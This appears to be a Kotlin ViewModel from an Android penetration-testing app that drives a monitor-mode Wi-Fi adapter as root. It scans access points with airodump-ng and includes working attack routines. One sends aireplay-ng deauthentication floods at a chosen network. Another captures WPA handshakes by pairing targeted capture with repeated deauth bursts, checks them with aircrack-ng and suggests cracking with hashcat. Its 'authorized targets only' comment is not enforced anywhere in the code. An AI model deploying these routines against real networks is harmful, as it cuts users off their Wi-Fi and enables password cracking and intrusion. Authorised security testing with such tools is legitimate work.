package dev.reforge.ui.screens

import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.setValue
import androidx.lifecycle.ViewModel
import androidx.lifecycle.viewModelScope
import dev.reforge.core.RootShell
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext

data class ApInfo(
    val bssid: String,
    val essid: String,
    val channel: String,
    val power: Int,     // dBm (negative; closer to 0 = stronger)
    val enc: String,
)

/**
 * Wireless — drives an external monitor-capable adapter (AR9271 / RT3070 class)
 * exposed as a second wlan interface. Toggles monitor mode with `iw` (never
 * `airmon-ng check kill`, which would drop wlan0 / wireless-ADB) and scans with
 * airodump-ng, parsing its CSV into an AP list.
 */
class WirelessViewModel : ViewModel() {
    var iface by mutableStateOf<String?>(null)
        private set
    var driver by mutableStateOf<String?>(null)
        private set
    var mode by mutableStateOf<String?>(null) // "monitor" | "managed" | null
    var busy by mutableStateOf(false)
        private set
    var scanning by mutableStateOf(false)
        private set
    var aps by mutableStateOf<List<ApInfo>>(emptyList())
        private set
    var message by mutableStateOf<String?>(null)
    var selected by mutableStateOf<ApInfo?>(null)
        private set
    var working by mutableStateOf(false)
        private set
    var action by mutableStateOf<String?>(null)

    init { detect() }

    fun select(ap: ApInfo) {
        selected = if (selected?.bssid == ap.bssid) null else ap
        action = null
    }

    /** Deauth frames at the selected AP (authorized targets only). */
    fun deauth(count: Int = 10) {
        val ap = selected ?: return
        val i = iface ?: return
        if (working || scanning) return
        working = true
        action = "sending $count deauth to ${ap.essid}…"
        viewModelScope.launch {
            withContext(Dispatchers.IO) {
                RootShell.chroot(
                    "iw dev $i set channel ${ap.channel} 2>/dev/null; " +
                        "aireplay-ng --deauth $count -a ${ap.bssid} $i 2>&1 | tail -2"
                )
            }
            action = "deauth $count sent to ${ap.essid} (ch ${ap.channel})"
            working = false
        }
    }

    /** Capture a WPA handshake: targeted airodump + deauth bursts, then verify. */
    fun capture(seconds: Int = 25) {
        val ap = selected ?: return
        val i = iface ?: return
        if (working || scanning) return
        working = true
        action = "capturing handshake on ${ap.essid}…"
        viewModelScope.launch {
            val out = withContext(Dispatchers.IO) {
                RootShell.chroot(
                    "iw dev $i set channel ${ap.channel} 2>/dev/null; " +
                        "rm -f /tmp/hs-*.cap /tmp/hs-*.csv /tmp/hs-*.netxml 2>/dev/null; " +
                        "timeout $seconds airodump-ng -c ${ap.channel} --bssid ${ap.bssid} -w /tmp/hs $i >/dev/null 2>&1 & " +
                        "AP=\$!; sleep 3; " +
                        "for n in 1 2 3 4 5; do aireplay-ng --deauth 5 -a ${ap.bssid} $i >/dev/null 2>&1; sleep 4; done; " +
                        "wait \$AP 2>/dev/null; " +
                        "if aircrack-ng /tmp/hs-01.cap 2>/dev/null | grep -qi 'handshake'; then echo HS_OK; else echo HS_NO; fi"
                )
            }
            action = if (out.contains("HS_OK"))
                "✅ Handshake captured → /tmp/hs-01.cap (crack with hashcat/aircrack)"
            else
                "No handshake yet — needs an active client on ${ap.essid}. cap at /tmp/hs-01.cap"
            working = false
        }
    }

    fun detect() {
        viewModelScope.launch {
            val line = withContext(Dispatchers.IO) { RootShell.chroot(DETECT).trim() }
                .lineSequence().firstOrNull { it.isNotBlank() }
            if (line == null) {
                iface = null; driver = null; mode = null
                message = "No external adapter. Plug in an AR9271 / RT3070 USB adapter."
            } else {
                val p = line.split(" ")
                iface = p.getOrNull(0)
                driver = p.getOrNull(1)?.ifBlank { "?" }
                mode = p.getOrNull(2)?.ifBlank { null }
                message = null
            }
        }
    }

    fun toggleMonitor() {
        val i = iface ?: return
        if (busy) return
        busy = true
        val toMonitor = mode != "monitor"
        viewModelScope.launch {
            withContext(Dispatchers.IO) {
                val type = if (toMonitor) "monitor" else "managed"
                val chan = if (toMonitor) "; iw dev $i set channel 6" else ""
                RootShell.chroot(
                    "ip link set $i down; iw dev $i set type $type 2>&1; ip link set $i up$chan"
                )
            }
            detect()
            busy = false
        }
    }

    fun scan(seconds: Int = 12) {
        val i = iface ?: return
        if (scanning || busy) return
        if (mode != "monitor") { message = "Enable monitor mode first."; return }
        scanning = true
        message = null
        viewModelScope.launch {
            val csv = withContext(Dispatchers.IO) {
                RootShell.chroot(
                    "rm -f /tmp/rfscan-*.csv 2>/dev/null; " +
                        "timeout $seconds airodump-ng --band bg -w /tmp/rfscan --output-format csv " +
                        "--write-interval 1 $i >/dev/null 2>&1; " +
                        "cat /tmp/rfscan-01.csv 2>/dev/null; rm -f /tmp/rfscan-*.csv 2>/dev/null"
                )
            }
            aps = parseCsv(csv)
            if (aps.isEmpty()) message = "No APs seen — try a different channel/spot."
            scanning = false
        }
    }

    // Parsing lives in the Rust native core (skyla_core) via UniFFI; see
    // rust/src/wifi.rs. Returns APs sorted by signal, strongest first.
    private fun parseCsv(csv: String): List<ApInfo> =
        uniffi.skyla_core.parseAirodumpCsv(csv)
            .map { ApInfo(it.bssid, it.essid, it.channel, it.power, it.enc) }

    companion object {
        // Prints "<iface> <driver> <mode>" for the first external wlan (not wlan0).
        private const val DETECT = """
            for i in ${'$'}(ls /sys/class/net 2>/dev/null); do
              case "${'$'}i" in
                wlan0|lo|p2p0) continue;;
                wlan*|wlx*)
                  drv=${'$'}(basename ${'$'}(readlink /sys/class/net/${'$'}i/device/driver 2>/dev/null) 2>/dev/null)
                  m=${'$'}(iw dev ${'$'}i info 2>/dev/null | grep -o 'type [a-z]*' | awk '{print ${'$'}2}')
                  echo "${'$'}i ${'$'}drv ${'$'}m"
                  break;;
              esac
            done
        """
    }
}
